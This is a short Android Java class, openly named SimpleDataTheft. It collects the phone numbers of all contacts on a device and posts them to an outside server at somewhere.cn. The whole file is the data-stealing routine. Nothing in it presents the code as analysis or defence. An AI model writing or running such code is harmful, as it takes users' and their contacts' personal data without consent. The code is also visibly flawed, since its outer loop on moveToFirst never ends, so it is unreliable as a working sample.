package com.example.android;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;

public class SimpleDataTheft {
	
	public void stealData(Context context) throws Exception {
		List<String> phones = new ArrayList<String>();
		
		Cursor cursor = context.getContentResolver().query(Contacts.CONTENT_LOOKUP_URI, null, null, null, null);
		
		while(cursor.moveToFirst()) {
			String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
			
			Cursor phonesCursor = context.getContentResolver().query(Phone.CONTENT_URI, null, Phone.CONTACT_ID + " = " + contactId, null, null);
			while(phonesCursor.moveToNext()) {
				String number = phonesCursor.getString(phonesCursor.getColumnIndex(Phone.NUMBER));
				phones.add(number);
			}
			phonesCursor.close();
		}
		cursor.close();
		
		HttpPost post = new HttpPost("http://www.somewhere.cn");
		post.setEntity(new StringEntity(phones.toString()));
		HttpClient client = null;
		try {
			client = new DefaultHttpClient();
			client.execute(post);
		}finally {
			if(client != null) {
				client.getConnectionManager().shutdown();
			}
		}
	}

}
